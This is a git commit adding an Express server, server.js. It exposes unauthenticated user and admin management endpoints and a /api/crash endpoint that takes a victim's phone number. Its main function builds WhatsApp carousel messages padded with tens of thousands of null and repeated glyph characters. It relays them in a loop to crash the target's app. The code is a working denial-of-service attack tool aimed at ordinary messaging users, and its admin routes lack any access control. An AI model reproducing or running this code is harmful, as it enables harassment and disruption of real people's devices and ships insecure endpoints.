a09c2ae7e404568ee9e1266adfb8a3f96a671fab
FarelYt <farelzh2@gmail.com>
2025-09-14 07:18:53 +0700

    Add files via upload

---
+++ server.js
@@ -0,0 +1,154 @@
+const express = require("express");
+const fs = require("fs");
+const crypto = require("crypto");
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
+app.use(express.static("public"));
+
+const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
+const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));
+
+app.post("/api/add-user", (req, res) => {
+  const { phone, role } = req.body;
+  const users = loadUsers();
+  users.push({ phone, role });
+  saveUsers(users);
+  res.json({ success: true, message: "User added." });
+});
+
+app.post("/api/add-admin", (req, res) => {
+  const { phone } = req.body;
+  const users = loadUsers();
+  users.push({ phone, role: "admin" });
+  saveUsers(users);
+  res.json({ success: true, message: "Admin added." });
+});
+
+app.post("/api/change-role", (req, res) => {
+  const { phone, newRole } = req.body;
+  const users = loadUsers();
+  const user = users.find(u => u.phone === phone);
+  if (user) {
+    user.role = newRole;
+    saveUsers(users);
+    res.json({ success: true, message: "Role updated." });
+  } else {
+    res.status(404).json({ success: false, message: "User not found." });
+  }
+});
+
+// TARO FUNCTIONMY
+
+
+async function YakuzaCrashNotif(target) {
+  for (let i = 0; i < 20; i++) {
+    let push = [];
+    let buttt = [];
+
+    for (let i = 0; i < 20; i++) {
+      buttt.push({
+        "name": "galaxy_message",
+        "buttonParamsJson": JSON.stringify({
+          "header": "\u0000".repeat(10000),
+          "body": "\u0000".repeat(10000),
+          "flow_action": "navigate",
+          "flow_action_payload": { screen: "FORM_SCREEN" },
+          "flow_cta": "Grattler",
+          "flow_id": "1169834181134583",
+          "flow_message_version": "3",
+          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
+        })
+      });
+    }
+
+    for (let i = 0; i < 10; i++) {
+      push.push({
+        "body": {
+          "text": "𝐘𝐚𝐤𝐮𝐳𝐚𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 炎 ⚔️𝐇𝐜-𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐃" + "ꦾ".repeat(11000)
+        },
+        "footer": {
+          "text": "𝐘𝐚𝐤𝐮𝐳𝐚𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 炎 ⚔️𝐇𝐜-𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐃"
+        },
+        "header": { 
+          "title": '𝐘𝐚𝐤𝐮𝐳𝐚𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 炎 ⚔️𝐇𝐜-𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐃' + "\u0000".repeat(50000),
+          "hasMediaAttachment": false,
+          "imageMessage": {
+            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
+            "mimetype": "image/jpeg",
+            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
+            "fileLength": "591",
+            "height": 0,
+            "width": 0,
+            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
+            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
+            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
+            "mediaKeyTimestamp": "1721344123",
+            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
+            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
+            "scanLengths": [
+              247,
+              201,
+              73,
+              63
+            ],
+            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
+          }
+        },
+        "nativeFlowMessage": {
+          "buttons": []
+        }
+      });
+    }
+
+    const carousel = generateWAMessageFromContent(target, {
+      "viewOnceMessage": {
+        "message": {
+          "messageContextInfo": {
+            "deviceListMetadata": {},
+            "deviceListMetadataVersion": 2
+          },
+          "interactiveMessage": {
+            "body": {
+              "text": "𝐘𝐚𝐤𝐮𝐳𝐚𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 炎 ⚔️𝐇𝐜-𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐃" + "ꦾ".repeat(55000)
+            },
+            "footer": {
+              "text": "𝐘𝐚𝐤𝐮𝐳𝐚𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 炎 ⚔️𝐇𝐜-𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐃"
+            },
+            "header": {
+              "hasMediaAttachment": false
+            },
+            "carouselMessage": {
+              "cards": [
+                ...push
+              ]
+            }
+          }
+        }
+      }
+    }, {});
+ await yakuza.relayMessage(target, carousel.message, {
+messageId: carousel.key.id
+});
+  }
+}
+
+
+//BATES FUNCTION 
+
+app.post("/api/crash", async (req, res) => {
+  const { target } = req.body;
+  if (!target) {
+    return res.status(400).json({ success: false, message: "Target number is required." });
+  }
+
+  try {
+    await InvisibleHome(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
+    res.json({ success: true, message: `Bug terkirim ke ${target}` });
+  } catch (err) {
+    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
+  }
+});
+
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
